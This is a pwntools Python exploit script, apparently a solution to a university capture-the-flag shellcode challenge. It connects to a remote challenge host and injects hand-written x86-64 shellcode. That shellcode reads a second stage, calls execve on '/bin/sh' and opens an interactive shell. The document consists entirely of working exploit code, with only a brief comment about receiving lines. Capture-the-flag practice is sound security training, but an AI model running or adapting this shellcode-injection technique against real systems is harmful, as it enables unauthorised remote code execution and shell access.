from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

#p = process(binary)
p = remote("cse4850-shellcode-1.chals.io", 443, ssl=True, sni="cse4850-shellcode-1.chals.io")

shellcode = asm('''
	/* read */

	/* rdi */
	push 0x2
	pop rdi
	sub edi, 0x2

	/* rsi */
	push rdx
	pop rsi

	/* rdx */
	push 0x42
	pop rdx

	syscall

	/* execve */

	/* rax */
	push 0x3b
	pop rdi
	xchg edi, eax

	/* rdi */
	push rsi
	pop rdi

	/* rsi */
	push 0x2
	pop rsi
	sub esi, 0x2

	/* rdx */
	push 0x2
	pop rdx
	sub edx, 0x2

	syscall
''')

p.sendline(shellcode)

# it hung here for a while before Tyler suggested trying 2 recvlines
p.recvline()
p.recvline()

p.sendline(b'/bin/sh\0')

p.interactive()
